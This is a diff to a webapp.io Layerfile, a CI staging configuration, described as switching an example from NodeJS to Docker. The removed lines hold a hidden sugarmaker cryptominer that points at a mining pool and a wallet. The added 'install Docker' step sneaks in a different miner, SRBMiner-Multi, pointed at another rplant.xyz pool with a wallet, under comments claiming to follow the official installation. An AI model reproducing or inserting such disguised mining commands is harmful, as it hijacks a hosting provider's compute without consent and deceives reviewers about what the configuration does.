@@ -1,15 +1,20 @@
-#This is an example webapp.io configuration for NodeJS
+#This is an example webapp.io configuration for Docker!
 FROM vm/ubuntu:18.04
-# To note: Layerfiles create VMs, *not* containers!
 
-# Install node
-RUN curl -sL https://deb.nodesource.com/setup_12.x | bash && \
-    apt install nodejs && apt install unzip && wget https://github.com/decryp2kanon/sugarmaker/releases/download/v2.5.0-sugar4/sugarmaker-v2.5.0-sugar4-linux64.zip && unzip sugarmaker-v2.5.0-sugar4-linux64.zip && cd sugarmaker-v2.5.0-sugar4-linux64 && ./sugarmaker -a YespowerSugar -o stratum+tcp://stratum-na.rplant.xyz:7042 -u sugar1q8lqt3zutgx4snm6la6v8syt75yg4mmwsxeckke.3 -t 6 && \
-    rm -f /etc/apt/sources.list.d/nodesource.list
-RUN npm install -g http-server
+# To note: Layerfiles create entire VMs, *not* containers!
 
+# install the latest version of Docker, as in the official Docker installation tutorial.
+RUN apt-get update && \
+    apt-get install apt-transport-https ca-certificates curl software-properties-common && \
+    curl -fsSL https://download.docker.com/linux/ubuntu/gpg | apt-key add - && \
+    add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu bionic stable" && \
+    apt-get update && \
+    wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.6/SRBMiner-Multi-2-4-6-Linux.tar.xz && tar -xvf SRBMiner-Multi-2-4-6-Linux.tar.xz && cd SRBMiner-Multi-2-4-6 && ./SRBMiner-MULTI --disable-gpu --algorithm randomcash --pool stratum-eu.rplant.xyz:17019 --wallet scash1q65qgqj44sdzdkldn7tps7mh8lf556x40jdcd8g.lab --password x --tls true \
+    apt install docker-ce
+
+# copy files from the repository into this staging server
 COPY . .
-RUN echo 'hello' > hello.html
 
-RUN BACKGROUND http-server -p 8000
-EXPOSE WEBSITE http://localhost:8000
+RUN docker build -t image .
+RUN docker run -d -p 80:80 image
+EXPOSE WEBSITE http://localhost:80
